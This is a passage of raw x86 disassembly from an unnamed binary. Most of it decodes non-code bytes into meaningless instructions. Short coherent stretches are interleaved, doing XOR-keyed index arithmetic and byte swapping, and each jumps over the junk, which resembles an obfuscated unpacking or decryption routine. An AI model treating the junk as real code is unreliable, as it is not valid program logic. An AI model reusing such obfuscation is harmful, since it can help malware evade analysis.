  408529:	ins    DWORD PTR es:[edi],dx
  40852a:	pushf  
  40852b:	sahf   
  40852c:	pop    ss
  40852d:	test   BYTE PTR [edi],ch
  40852f:	out    dx,eax
  408530:	xchg   ebx,eax
  408531:	enter  0xece4,0xf7
  408535:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408536:	scas   al,BYTE PTR es:[edi]
  408537:	pop    ebx
  408538:	pop    ebp
  408539:	neg    DWORD PTR [edx]
  40853b:	(bad)  
  40853d:	clc    
  40853e:	les    eax,FWORD PTR [ebp+0x11a35c5]
  408544:	out    dx,al
  408545:	mov    eax,ds:0x34206ed9
  40854a:	pop    esi
  40854b:	popa   
  40854c:	mov    dl,0x8
  40854e:	cmc    
  40854f:	inc    ebp
  408550:	lock sub DWORD PTR [ecx-0x56b64c0e],edi
  408557:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408558:	inc    ebp
  408559:	(bad)
  40855d:	and    DWORD PTR [ebx+edi*1],0xffffff93
  408561:	sub    eax,0xcccbe748
  408566:	push   edi
  408567:	xchg   ebp,eax
  408568:	test   eax,0x96b756a7
  40856d:	test   DWORD PTR [ecx+eiz*1],0xf0a9d851
  408574:	(bad)  [edi]
  408576:	sub    eax,0xeb4344af
  40857b:	push   edx
  40857c:	retf   0xf84d
  40857f:	inc    ebp
  408580:	push   ds
  408581:	push   0xeda30588
  408586:	sar    bh,0x3b
  408589:	fimul  DWORD PTR [edi]
  40858b:	xchg   DWORD PTR [eax],ecx
  40858d:	add    BYTE PTR [eax],al
  40858f:	add    BYTE PTR [ebx-0x271633ab],cl
  408595:	add    DWORD PTR [eax],eax
  408597:	add    BYTE PTR [ebx+0x7d8bc455],cl
  40859d:	cld    
  40859e:	xor    edx,eax
  4085a0:	xor    edi,eax
  4085a2:	add    edx,ecx
  4085a4:	add    edi,ecx
  4085a6:	imul   edx,edi
  4085a9:	mov    edi,DWORD PTR [ebp-0x8]
  4085ac:	mov    ebx,DWORD PTR [ebp-0x10]
  4085af:	sub    ebx,edi
  4085b1:	jmp    0x408762
  4085b6:	add    eax,0x7405640f
  4085bb:	jne    0x408622
  4085bd:	(bad)  
  4085bf:	mov    eax,0x5387353f
  4085c4:	int3   
  4085c5:	call   0x7f8a:0x7e7ed7e1
  4085cc:	jle    0x40864c
  4085ce:	xlat   BYTE PTR ds:[ebx]
  4085cf:	or     eax,0x1d842efa
  4085d4:	imul   edx,DWORD PTR [esi],0x57
  4085d7:	inc    ebp
  4085d8:	add    DWORD PTR [edi-0x17],edx
  4085db:	jecxz  0x408606
  4085dd:	fstp   QWORD PTR ds:0x9603d570
  4085e3:	popa   
  4085e4:	pop    ds
  4085e5:	pop    ds
  4085e6:	inc    edx
  4085e7:	jb     0x4085cf
  4085e9:	int    0x83
  4085eb:	add    eax,0x307b3555
  4085f0:	retf   
  4085f1:	inc    edi
  4085f2:	call   0x1d7f:0xb8f7fe36
  4085f9:	pop    edx
  4085fa:	sub    BYTE PTR [edi+0x4a],ah
  4085fd:	pop    es
  4085fe:	xchg   esp,eax
  4085ff:	enter  0x875,0xef
  408603:	fsubr  QWORD PTR [ecx+ecx*8+0x68]
  408607:	bound  eax,QWORD PTR [ebx-0x23]
  40860a:	aam    0x69
  40860c:	mov    ebp,0xfc451c33
  408611:	pushf  
  408612:	shl    DWORD PTR [ebx-0x309254aa],cl
  408618:	mov    ah,0x68
  40861a:	fmul   st,st(0)
  40861c:	js     0x408610
  40861e:	mov    ch,0x91
  408620:	call   DWORD PTR [eax]
  408622:	std    
  408623:	inc    ecx
  408624:	inc    edx
  408625:	sbb    eax,0x325f8fea
  40862a:	jg     0x4085d6
  40862c:	sub    BYTE PTR [eax+0x27],0x46
  408630:	imul   eax,esi,0xffffffe7
  408633:	mov    ?,WORD PTR [edx+0x19599505]
  408639:	dec    ecx
  40863a:	rol    bh,1
  40863c:	ror    BYTE PTR [ebp+0x6d6387fa],1
  408642:	add    ch,BYTE PTR [ebp-0x1a5b25e7]
  408648:	mov    edi,DWORD PTR [ebx]
  40864a:	mov    bh,0xfb
  40864c:	mov    ds:0x2120c4dd,eax
  408651:	aas    
  408652:	add    esi,ebp
  408654:	not    BYTE PTR [esp+edx*8+0x3]
  408658:	mov    dl,0xda
  40865a:	pop    esp
  40865b:	inc    ebp
  40865c:	dec    eax
  40865d:	fisttp QWORD PTR [edi+ebp*8]
  408660:	push   edx
  408661:	js     0x408658
  408663:	mov    BYTE PTR ds:0x4bce7cd4,dh
  408669:	test   eax,0x77498a0b
  40866e:	xchg   ebx,eax
  40866f:	or     esp,esp
  408671:	(bad)  
  408672:	out    0x2b,al
  408674:	fld    TBYTE PTR [esi+eiz*4]
  408677:	xor    esi,ebx
  408679:	outs   dx,BYTE PTR ds:[si]
  40867b:	loop   0x408669
  40867d:	sbb    DWORD PTR [esp+edx*4-0x77],esi
  408681:	sti    
  408682:	lods   al,BYTE PTR ds:[esi]
  408683:	push   edi
  408684:	scas   eax,DWORD PTR es:[edi]
  408685:	xor    al,BYTE PTR [edi+0x7c]
  408688:	mov    DWORD PTR [ebx+ebx*8],ebp
  40868b:	xlat   BYTE PTR ds:[ebx]
  40868c:	and    ah,bh
  40868e:	pop    ebx
  40868f:	faddp  st(0),st
  408691:	inc    edx
  408692:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408693:	sub    al,0xf9
  408695:	mov    ebx,DWORD PTR [eax-0x5ba58c97]
  40869b:	js     0x4086a2
  40869d:	in     al,dx
  40869e:	cmp    BYTE PTR [edx-0x76],bh
  4086a1:	push   es
  4086a2:	and    eax,0x140c58d1
  4086a7:	leave  
  4086a8:	data16 cld 
  4086aa:	sbb    BYTE PTR [edi-0x4d],cl
  4086ad:	das    
  4086ae:	jb     0x408724
  4086b0:	popf   
  4086b1:	inc    edi
  4086b2:	jns    0x40865a
  4086b4:	add    bh,0x59
  4086b7:	adc    BYTE PTR [edx-0x26],bl
  4086ba:	push   ebp
  4086bb:	pop    edi
  4086bc:	xchg   BYTE PTR [edx+eiz*4-0x3f],al
  4086c0:	rol    BYTE PTR [edi],1
  4086c2:	add    cl,BYTE PTR [edx]
  4086c4:	and    esi,esp
  4086c6:	jl     0x4086d3
  4086c8:	arpl   WORD PTR ds:0xa043cbee,sp
  4086ce:	add    edx,esp
  4086d0:	mov    WORD PTR [ebp-0x60],?
  4086d3:	sbb    ebx,DWORD PTR [ebx]
  4086d5:	jne    0x4086df
  4086d7:	pop    edx
  4086d8:	lock fadd st,st(6)
  4086db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086dc:	icebp  
  4086dd:	rcl    DWORD PTR [ecx-0x7],cl
  4086e0:	int    0x54
  4086e2:	or     ecx,edi
  4086e4:	test   eax,0x4340be1e
  4086e9:	fst    QWORD PTR [ecx+esi*8+0x55881bfb]
  4086f0:	int3   
  4086f1:	adc    ecx,DWORD PTR [eax+0x23000764]
  4086f7:	jecxz  0x4086db
  4086f9:	sar    BYTE PTR [ebx+0x64e8068c],0xa4
  408700:	adc    DWORD PTR [esp+edx*1-0x10],esp
  408704:	std    
  408705:	or     BYTE PTR [esp+edx*2+0x604dce62],dl
  40870c:	iret   
  40870d:	mov    esi,0x624f5bae
  408712:	mov    edx,0xfc6edf66
  408717:	out    dx,al
  408718:	retf   0x3af7
  40871b:	mov    esp,0x2897a60b
  408720:	mov    ebp,0x52783e1a
  408725:	(bad)  
  408726:	out    dx,al
  408727:	fwait
  408728:	mov    ecx,0x8d0f0247
  40872d:	mov    eax,0xcb446bdb
  408732:	jae    0x40875d
  408734:	popa   
  408735:	dec    edi
  408736:	add    BYTE PTR [ecx+0x1],dh
  408739:	idiv   BYTE PTR [edi-0xd41f9fd]
  40873f:	outs   dx,DWORD PTR ds:[esi]
  408740:	or     al,BYTE PTR ds:0xba2fb080
  408746:	and    eax,0xa31cc25d
  40874b:	cmp    ebp,esp
  40874d:	and    DWORD PTR [edi-0x43],ecx
  408750:	(bad)  
  408751:	push   esp
  408752:	daa    
  408753:	aam    0x6a
  408755:	fisttp QWORD PTR [ebp+0x63]
  408758:	ss std 
  40875a:	in     al,0xeb
  40875c:	inc    ecx
  40875d:	clc    
  40875e:	jg     0x4086f4
  408760:	or     al,0xf7
  408762:	cmp    ebx,edx
  408764:	mov    edx,DWORD PTR [ebp-0x38]
  408767:	jbe    0x408770
  40876d:	mov    edx,DWORD PTR [ebp-0x3c]
  408770:	mov    edi,DWORD PTR [ebp-0x4]
  408773:	xor    edi,eax
  408775:	xor    edx,eax
  408777:	add    edi,ecx
  408779:	add    edx,ecx
  40877b:	imul   edx,edi
  40877e:	mov    DWORD PTR [ebp+0xc],edx
  408781:	mov    edx,DWORD PTR [ebp+0xc]
  408784:	mov    DWORD PTR [ebp-0x24],edx
  408787:	mov    edx,DWORD PTR [ebp-0x8]
  40878a:	add    edx,DWORD PTR [ebp-0x40]
  40878d:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  408794:	mov    DWORD PTR [ebp-0x1c],edx
  408797:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  40879e:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  4087a5:	mov    edx,DWORD PTR [ebp-0x18]
  4087a8:	xor    edx,eax
  4087aa:	add    edx,ecx
  4087ac:	jmp    0x408819
  4087b1:	mov    edx,DWORD PTR [ebp-0x18]
  4087b4:	xor    edx,eax
  4087b6:	add    edx,DWORD PTR [ebp-0x14]
  4087b9:	mov    edi,DWORD PTR [ebp-0x1c]
  4087bc:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  4087c3:	mov    BYTE PTR [ebp+0xf],dl
  4087c6:	mov    edx,DWORD PTR [ebp-0xc]
  4087c9:	xor    edx,eax
  4087cb:	add    edx,DWORD PTR [ebp-0x14]
  4087ce:	mov    edi,DWORD PTR [ebp-0x1c]
  4087d1:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  4087d8:	mov    BYTE PTR [ebp+0xb],dl
  4087db:	mov    dl,BYTE PTR [ebp+0xf]
  4087de:	mov    edi,DWORD PTR [ebp-0xc]
  4087e1:	xor    edi,eax
  4087e3:	add    edi,DWORD PTR [ebp-0x14]
  4087e6:	mov    ebx,DWORD PTR [ebp-0x1c]
  4087e9:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4087f0:	mov    dl,BYTE PTR [ebp+0xb]
  4087f3:	mov    edi,DWORD PTR [ebp-0x18]
  4087f6:	xor    edi,eax
  4087f8:	add    edi,DWORD PTR [ebp-0x14]
  4087fb:	mov    ebx,DWORD PTR [ebp-0x1c]
  4087fe:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  408805:	mov    edx,DWORD PTR [ebp-0x44]
  408808:	mov    edi,DWORD PTR [ebp-0xc]
  40880b:	xor    edx,eax
  40880d:	xor    edi,eax
  40880f:	add    edx,ecx
  408811:	add    edi,ecx
  408813:	imul   edx,edi
  408816:	add    edx,DWORD PTR [ebp-0x14]
  408819:	mov    DWORD PTR [ebp-0x14],edx
  40881c:	mov    edx,DWORD PTR [ebp-0xc]
  40881f:	mov    edi,DWORD PTR [ebp-0x24]
  408822:	xor    edx,eax
  408824:	add    edx,ecx
  408826:	imul   edx,edi
  408829:	mov    edi,DWORD PTR [ebp-0xc]
  40882c:	xor    edi,eax
  40882e:	sub    edx,edi
  408830:	mov    edi,DWORD PTR [ebp-0xc]
  408833:	mov    ebx,DWORD PTR [ebp-0x14]
  408836:	jmp    0x4089e7
  40883b:	mov    ebx,0x516c50c8
  408840:	je     0x4088a5
  408842:	jmp    0xab204522
  408847:	add    al,0x68
  408849:	enter  0x7daa,0xd5
  40884d:	jle    0x4088cd
  40884f:	mov    bh,BYTE PTR [edi+0x7e]
  408852:	jle    0x4088c8
  408854:	aam    0x59
  408856:	xor    ecx,ebx
  408858:	adc    DWORD PTR [edi+ecx*4-0x58df10aa],esi
  40885f:	and    esp,eax
  408861:	mov    ebp,0x5952d8d9
  408866:	and    cl,cl
  408868:	in     al,dx
  408869:	popf   
  40886a:	jle    0x408886
  40886c:	pop    eax
  40886d:	xor    DWORD PTR [ecx-0x215bc224],0xd7e60782
  408877:	xchg   ebx,eax
  408878:	dec    esp
  408879:	inc    edx
  40887a:	in     al,dx
  40887b:	sbb    edx,ecx
  40887d:	test   BYTE PTR [ebx-0x69],dh
  408880:	rcr    BYTE PTR [ebx-0x5e],0x63
  408884:	jno    0x40884d
  408886:	aam    0x91
  408888:	inc    edx
  408889:	jnp    0x408832
  40888b:	and    dl,BYTE PTR [edi+0x20a0c1b9]
  408891:	pop    esi
  408892:	sub    DWORD PTR [ecx-0x7e19b1ab],esi
  408898:	push   DWORD PTR [ebx+0x6b7b9547]
  40889e:	inc    edx
  40889f:	or     bl,BYTE PTR [edx+0x67]
  4088a2:	fucomi st,st(5)
  4088a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088a5:	pop    ss
  4088a6:	mov    ah,0x37
  4088a8:	in     al,0x6c
  4088aa:	clc    
  4088ab:	sti    
  4088ac:	mov    es,WORD PTR [edx-0x5349797f]
  4088b2:	shr    DWORD PTR [ebp+0x1cf94059],1
  4088b8:	les    ecx,FWORD PTR [ebx]
  4088ba:	add    eax,0x6e09969f
  4088bf:	mov    edx,0x8db27b31
  4088c4:	mov    ebx,0xb96f3391
  4088c9:	jo     0x40890e
  4088cb:	repz mov bl,0x22
  4088ce:	pop    ebp
  4088cf:	add    edx,DWORD PTR [ebx-0x2caca29b]
  4088d5:	push   ss
  4088d6:	or     eax,0x586aad63
  4088db:	js     0x408905
  4088dd:	div    BYTE PTR [esi-0x4239709]
  4088e3:	push   esi
  4088e4:	mov    ebp,gs
  4088e6:	out    dx,al
  4088e7:	fs push 0x4b
  4088ea:	jg     0x40890e
  4088ec:	sahf   
  4088ed:	in     al,dx
  4088ee:	pop    ss
  4088ef:	call   FWORD PTR [ebp+0x70feadc3]
  4088f5:	xor    BYTE PTR [eax],0x2f
  4088f8:	pop    esp
  4088f9:	jae    0x40896b
  4088fb:	adc    dh,bl
  4088fd:	fwait
  4088fe:	mov    ah,0xdf
  408900:	add    al,0x19
  408902:	mov    edx,0x681a99a2
  408907:	out    dx,eax
  408908:	loop   0x4088ad
  40890a:	and    bl,al
  40890c:	aaa    
  40890d:	retf   0x43b
  408910:	out    dx,eax
  408911:	dec    dh
  408913:	jo     0x408981
  408915:	xor    al,BYTE PTR [edi+0x33]
  408918:	and    ebx,DWORD PTR [edx]
  40891a:	and    DWORD PTR [edi-0x3046f4d1],eax
  408920:	call   0x764f:0x56d134b1
  408927:	mov    ds:0xa55e1c45,eax
  40892c:	jmp    0x40899d
  40892e:	std    
  40892f:	repz xor cl,BYTE PTR [eax+0x7f]
  408933:	mov    edx,0x2d5a69e0
  408938:	mov    esp,DWORD PTR [edx-0x10]
  40893b:	out    dx,al
  40893c:	dec    ebp
  40893d:	cmc    
  40893e:	mov    cl,0x8d
  408940:	xchg   ebx,eax
  408941:	mov    edi,0x6bd1708b
  408946:	sub    edx,edi
  408948:	jmp    0x1bd0:0x7010e99e
  40894f:	jnp    0x4088d2
  408951:	test   eax,0x4df1e573
  408956:	xchg   ebp,eax
  408957:	fld    st(3)
  408959:	mov    eax,ds:0x92901737
  40895e:	push   ebp
  40895f:	repz cmp eax,0xd289fe52
  408965:	int    0x18
  408967:	sub    DWORD PTR [ecx+0xdaf4520],ebx
  40896d:	sahf   
  40896e:	aas    
  40896f:	and    eax,0x7412f0d5
  408974:	and    esi,edx
  408976:	test   BYTE PTR [esi-0x1fba5d79],cl
  40897c:	test   al,0xe6
  40897e:	ins    BYTE PTR es:[edi],dx
  40897f:	pop    ebp
  408980:	mov    al,0xd1
  408982:	xchg   BYTE PTR [esi-0x4f],bl
  408985:	test   DWORD PTR [bx+si-0x3070],ebp
  40898a:	jnp    0x4089ed
  40898c:	inc    esi
  40898d:	jnp    0x4089e1
  40898f:	sbb    BYTE PTR [edx+0x33],ch
  408992:	jecxz  0x4089a5
  408994:	mov    ebp,0x3cc09158
  408999:	sub    al,0xa4
  40899b:	cdq    
  40899c:	test   al,0x86
  40899e:	jp     0x408a10
  4089a0:	outs   dx,BYTE PTR ds:[esi]
  4089a1:	iret   
  4089a2:	mov    ds:0xd12e0c3c,al
  4089a7:	out    dx,eax
  4089a8:	mov    edi,0x9988ac4a
  4089ad:	mov    esp,0x8aabce01
  4089b2:	mov    cl,0x96
  4089b4:	xlat   BYTE PTR ds:[ebx]
  4089b5:	jnp    0x4089f4
  4089b7:	push   edx
  4089b8:	dec    esp
  4089b9:	inc    eax
  4089ba:	das    
  4089bb:	adc    BYTE PTR [ecx],cl
  4089bd:	iret   
  4089be:	fidiv  DWORD PTR [eax+0x7c]
  4089c1:	stos   DWORD PTR es:[edi],eax
  4089c2:	xchg   esi,eax
  4089c3:	xchg   edi,eax
  4089c4:	outs   dx,BYTE PTR ds:[esi]
  4089c5:	(bad)  
  4089c6:	nop
  4089c7:	jmp    0x4089c9
  4089c9:	fwait
  4089ca:	pop    esp
  4089cb:	loopne 0x408966
  4089cd:	jae    0x408a35
  4089cf:	mov    ebx,0x4b6a298f
  4089d4:	jmp    0x408980
  4089d6:	fisttp DWORD PTR [edi+0xf]
  4089d9:	loope  0x408988
  4089db:	cli    
  4089dc:	xor    eax,0x9c1a30cc
  4089e1:	mov    DWORD PTR ds:0xc59ffdb9,0xf903f833
  4089eb:	imul   edi,ebx
  4089ee:	mov    ebx,DWORD PTR [ebp-0x18]
  4089f1:	xor    ebx,eax
  4089f3:	sub    edx,ecx
  4089f5:	jmp    0x408ba6
  4089fa:	dec    DWORD PTR [edx-0x5a]
  4089fd:	xor    eax,0x708df173
  408a02:	xchg   esp,eax
  408a03:	lea    ebx,[ecx+0xd]
  408a06:	in     eax,0x92
  408a08:	xchg   esp,eax
  408a09:	and    cl,BYTE PTR [ecx-0x7581812e]
  408a0f:	jg     0x408a8f
  408a11:	jle    0x408995
  408a13:	mov    eax,ds:0x8fdb9e7
  408a18:	push   0xffffffac
  408a1a:	push   0x5c62f38f
  408a1f:	mov    al,0xa2
  408a21:	sbb    eax,0x4518767f
  408a26:	mov    ds:0xf604c241,eax
  408a2b:	jae    0x408a71
  408a2d:	push   cs
  408a2e:	ret    
  408a2f:	mov    bl,0x2a
  408a31:	inc    esi
  408a32:	neg    DWORD PTR [ebx]
  408a34:	adc    BYTE PTR [ebp+0x23d393f4],dl
  408a3a:	out    0xb5,eax
  408a3c:	out    dx,al
  408a3d:	test   eax,0x6030aa26
  408a42:	aad    0x2e
  408a44:	jp     0x408a56
  408a46:	push   cs
  408a47:	pop    es
  408a48:	pusha  
  408a49:	lock or eax,0x9f722a35
  408a4f:	push   edx
  408a50:	inc    ebx
  408a51:	scas   eax,DWORD PTR es:[edi]
  408a52:	sbb    eax,0xee6955fb
  408a57:	xchg   esi,eax
  408a58:	add    BYTE PTR [esi],ch
  408a5a:	nop
  408a5b:	popa   
  408a5c:	jmp    0x3379:0xf1cb91c8
  408a63:	mov    edi,0x87cb94e9
  408a68:	xchg   ebx,eax
  408a69:	mov    eax,0x2ccab805
  408a6e:	in     al,dx
  408a6f:	xor    BYTE PTR [ebp-0x7e23fbea],dh
  408a75:	mov    BYTE PTR [ebp+ebx*2-0x4a],dl
  408a79:	add    DWORD PTR [eax],esi
  408a7b:	mov    BYTE PTR [ecx-0x20],cl
  408a7e:	(bad)  
  408a7f:	das    
  408a80:	dec    ecx
  408a81:	out    dx,al
  408a82:	jg     0x408a18
  408a84:	es mov bh,0x44
  408a87:	call   0x2068:0xf8750606
  408a8e:	mov    ebx,0x81d18d45
  408a93:	div    dh
  408a95:	aam    0x65
  408a97:	jge    0x408a76
  408a99:	outs   dx,BYTE PTR ds:[esi]
  408a9a:	jno    0x408a58
  408a9c:	pop    ds
  408a9d:	sub    ebx,DWORD PTR [ebp+0x15]
  408aa0:	dec    edi
  408aa1:	shl    DWORD PTR [ebx+ebx*1],0x5f
  408aa5:	cmc    
  408aa6:	ss mov cl,0xcd
  408aa9:	jp     0x408abf
  408aab:	outs   dx,DWORD PTR ds:[esi]
  408aac:	mov    bh,0x56
  408aae:	pop    esp
  408aaf:	int    0xbe
  408ab1:	bound  esi,QWORD PTR [esi]
  408ab3:	lock or eax,0x58dcdeec
  408ab9:	adc    ecx,DWORD PTR [ebx+0x53773fd9]
  408abf:	aaa    
  408ac0:	add    BYTE PTR [eax+0x562f64c3],bl
  408ac6:	rcr    DWORD PTR [eax+0x128a548d],cl
  408acc:	pushf  
  408acd:	jge    0x408b3b
  408acf:	pop    esp
  408ad0:	int3   
  408ad1:	cs out 0xb7,al
  408ad4:	fcom   DWORD PTR [edi+0x76e4b07b]
  408ada:	lds    esp,FWORD PTR [ecx-0x40]
  408add:	xchg   edi,eax
  408ade:	test   ch,0xb5
  408ae1:	mov    ecx,fs
  408ae3:	push   ebx
  408ae4:	push   ebp
  408ae5:	and    BYTE PTR [edi],dl
  408ae7:	xor    edi,edi
  408ae9:	mov    ?,WORD PTR [esi]
  408aeb:	mov    ds:0x1994ef88,eax
  408af0:	out    dx,eax
  408af1:	or     eax,0x51e3ea76
  408af6:	out    0xab,eax
  408af8:	pushf  
  408af9:	dec    ebp
  408afa:	push   eax
  408afb:	scas   eax,DWORD PTR es:[edi]
  408afc:	js     0x408ad6
  408afe:	lock rcr BYTE PTR [ecx-0x4e],cl
  408b02:	outs   dx,DWORD PTR ds:[esi]
  408b03:	dec    esi
  408b04:	es jecxz 0x408ab6
  408b07:	rcr    dl,0x61
  408b0a:	jecxz  0x408a9d
  408b0c:	sbb    DWORD PTR [ebx],eax
  408b0e:	mov    esi,DWORD PTR [esi+ebp*1-0x70]
  408b12:	or     BYTE PTR ds:0x71ede712,0x37
  408b19:	add    ah,BYTE PTR [bp+di+0x30]
  408b1d:	jb     0x408aed
  408b1f:	push   edi
  408b20:	fsub   DWORD PTR [ebx]
  408b22:	in     eax,0x2e
  408b24:	jge    0x408b95
  408b26:	pop    ss
  408b27:	rol    BYTE PTR [edi-0x4],cl
  408b2a:	inc    esp
  408b2b:	jb     0x408aee
  408b2d:	shr    BYTE PTR [edi+0x3cb92a0f],0x2e
  408b34:	mov    ds:0x86ba8159,al
  408b39:	dec    esi
  408b3a:	sbb    dh,cl
  408b3c:	sbb    DWORD PTR [ecx-0x56],edx
  408b3f:	mov    esp,ebp
  408b41:	(bad)  
  408b42:	loope  0x408ac9
  408b44:	sub    eax,0x31a52e48
  408b49:	jmp    0x58eee97a
  408b4e:	xor    cl,BYTE PTR [esi+0x38359a54]
  408b54:	les    esi,FWORD PTR [esi+ebx*8+0x78686e93]
  408b5b:	icebp  
  408b5c:	sub    esi,DWORD PTR [ecx+0x78372a69]
  408b62:	jg     0x408b06
  408b64:	ins    BYTE PTR es:[edi],dx
  408b65:	sbb    BYTE PTR [edi-0x3c],0x43
  408b69:	mov    ah,0xeb
  408b6b:	cmp    al,0xfb
  408b6d:	adc    eax,0xbced57e0
  408b72:	sub    ch,BYTE PTR [ebp+0x7f]
  408b75:	or     DWORD PTR [ebx],ebp
  408b77:	mov    esp,0x84527f87
  408b7c:	and    eax,0x3fddd882
  408b81:	stos   BYTE PTR es:[edi],al
  408b82:	cs das 
  408b84:	jae    0x408b74
  408b86:	mov    eax,ds:0xf0489108
  408b8b:	and    eax,0x5fe9ef88
  408b90:	popa   
  408b91:	dec    ebp
  408b92:	cs sub bh,dl
  408b95:	xor    al,0x9b
  408b97:	inc    eax
  408b98:	and    al,0x8
  408b9a:	js     0x408b79
  408b9c:	out    0x43,eax
  408b9e:	int3   
  408b9f:	fwait
  408ba0:	imul   edi,DWORD PTR [ecx+0x4],0x8dd60810
  408ba7:	mov    esp,0x32729b1f
  408bac:	add    BYTE PTR [ebx],bh
  408bae:	cli    
  408baf:	jbe    0x4087b1
  408bb5:	mov    edx,DWORD PTR [ebp-0xc]
  408bb8:	mov    edi,DWORD PTR [ebp-0x24]
  408bbb:	xor    edx,eax
  408bbd:	add    edx,ecx
  408bbf:	imul   edx,edi
  408bc2:	mov    edi,DWORD PTR [ebp-0x18]
  408bc5:	xor    edi,eax
  408bc7:	jmp    0x408d78
  408bcc:	and    eax,0x71ffb36e
  408bd1:	inc    ebx
  408bd2:	xor    DWORD PTR [edx+eiz*8-0xd],esi
  408bd6:	ret    
  408bd7:	das    
  408bd8:	dec    ecx
  408bd9:	fld    TBYTE PTR [eax+0x7ed02590]
  408bdf:	jle    0x408b6b
  408be1:	jg     0x408c61
  408be3:	jle    0x408b92
  408be5:	mov    bl,0x4c
  408be7:	stos   DWORD PTR es:[edi],eax
  408be8:	outs   dx,DWORD PTR ds:[esi]
  408be9:	xor    eax,0xd27685dc
  408bee:	pushf  
  408bef:	lock xlat BYTE PTR ds:[ebx]
  408bf1:	and    eax,0xe1806478
  408bf6:	push   eax
  408bf7:	pop    es
  408bf8:	jmp    0xdd573a76
  408bfd:	les    ebx,FWORD PTR [ecx+0x19]
  408c00:	mov    al,ds:0xcbcafc14
  408c05:	push   ebp
  408c06:	daa    
  408c07:	(bad)  
  408c08:	cs test eax,0x18ecd633
  408c0e:	push   ebp
  408c10:	data16 xor BYTE PTR [eax],0xe
  408c14:	xchg   ebp,eax
  408c15:	std    
  408c16:	int3   
  408c17:	xlat   BYTE PTR ds:[ebx]
  408c18:	(bad)  [ebx+0x339c466b]
  408c1e:	call   0x92a388b1
  408c23:	push   es
  408c24:	(bad)  
  408c25:	arpl   WORD PTR [ebx-0x80],dx
  408c28:	imul   esp,DWORD PTR [ebp-0x23],0xcd9947e9
  408c2f:	adc    esi,DWORD PTR [edi-0x57]
  408c32:	fwait
  408c33:	add    al,bh
  408c35:	xchg   esp,eax
  408c36:	popf   
  408c37:	dec    edx
  408c38:	mov    cl,0x35
  408c3a:	pop    esi
  408c3b:	mov    ah,0x45
  408c3d:	jecxz  0x408bc9
  408c3f:	and    DWORD PTR [ebx+edi*8+0x76fd0af9],ebp
  408c46:	and    al,0xf1
  408c48:	and    eax,0x8ea961fa
  408c4d:	std    
  408c4e:	jns    0x408c8f
  408c50:	rcl    BYTE PTR [ebx],0x80
  408c53:	xchg   esi,eax
  408c54:	mov    dl,0x57
  408c56:	or     al,0xee
  408c58:	or     BYTE PTR [edx-0x57da44ae],bh
  408c5e:	aam    0xe5
  408c60:	or     esp,edx
  408c62:	and    DWORD PTR [eax-0x788b589],ebx
  408c68:	jp     0x408ce0
  408c6a:	fst    DWORD PTR [eax-0x74]
  408c6d:	cmp    al,BYTE PTR [edx]
  408c6f:	sub    edx,DWORD PTR [ebx+esi*4]
  408c72:	adc    dl,BYTE PTR [esi]
  408c74:	xchg   BYTE PTR [ecx+0x64],bh
  408c77:	and    al,0xc1
  408c79:	cmp    esp,esi
  408c7b:	fcmovne st,st(0)
  408c7d:	xor    BYTE PTR [ebp-0x18],bh
  408c80:	mov    al,0x7a
  408c82:	jmp    0x4980:0xd2ee2d97
  408c89:	mov    bl,0x9f
  408c8c:	addr16 push esp
  408c8e:	cmp    eax,DWORD PTR [ebx-0x6a]
  408c91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c92:	daa    
  408c93:	fiadd  WORD PTR cs:[edx+0xd]
  408c97:	das    
  408c98:	mov    DWORD PTR [ebx+0x35a7938e],0x20309fcb
  408ca2:	cwde   
  408ca3:	retf   
  408ca4:	fs mov dl,0x89
  408ca7:	sbb    cl,BYTE PTR [eax-0x7dba4022]
  408cad:	inc    esp
  408cae:	and    al,BYTE PTR [ecx]
  408cb0:	xor    BYTE PTR [ebp+0x36],dh
  408cb3:	push   edi
  408cb4:	pop    edi
  408cb5:	xor    al,BYTE PTR [edi+0x35]
  408cb8:	mov    edi,0x597a3373
  408cbd:	pop    esp
  408cbe:	xchg   esi,eax
  408cbf:	and    BYTE PTR [ebp-0x5a],0xe7
  408cc3:	cmp    ah,ch
  408cc5:	add    edi,DWORD PTR [edx-0x57c4eb4d]
  408ccb:	ret    0x2ddd
  408cce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ccf:	sar    DWORD PTR [ebp-0x42329d2d],0xa1
  408cd6:	cmp    eax,esp
  408cd8:	int3   
  408cd9:	lea    ebp,cs:[edx+0x40c065bd]
  408ce0:	mov    dl,0x30
  408ce2:	jo     0x408cff
  408ce4:	lods   al,BYTE PTR ds:[esi]
  408ce5:	inc    DWORD PTR [edx+edx*4]
  408ce8:	inc    esi
  408ce9:	int3   
  408cea:	push   ss
  408ceb:	ja     0x408cb3
  408ced:	cld    
  408cee:	push   ebp
  408cef:	cmp    bh,BYTE PTR [eax-0x64dbe1bb]
  408cf5:	pop    ebx
  408cf6:	cmp    eax,0xc12b42e4
  408cfb:	mov    cs,WORD PTR [eax-0x7e]
  408cfe:	sub    eax,0x110b7cae
  408d03:	in     al,0x7f
  408d05:	fwait
  408d06:	nop
  408d07:	dec    edi
  408d08:	xchg   ebx,eax
  408d09:	push   0xee68bd22
  408d0e:	push   0xffffffd5
  408d10:	mov    BYTE PTR [ecx],cl
  408d12:	push   ebp
  408d13:	xchg   esi,eax
  408d14:	mul    BYTE PTR [ebx]
  408d16:	pop    ss
  408d17:	sub    BYTE PTR [esi+edx*2],ch
  408d1a:	inc    esp
  408d1b:	and    eax,eax
  408d1d:	xor    edi,DWORD PTR [edx]
  408d1f:	sbb    ecx,DWORD PTR [ecx-0x5f06f9c9]
  408d25:	xchg   DWORD PTR [ecx*1+0x2b604f83],ebp
  408d2c:	out    0xc4,al
  408d2e:	push   ebx
  408d2f:	imul   edx,DWORD PTR [edx+esi*8+0x3d4751],0x8aac6255
  408d3a:	or     BYTE PTR [esi+0x69],dh
  408d3d:	adc    ch,0xca
  408d40:	adc    ah,cl
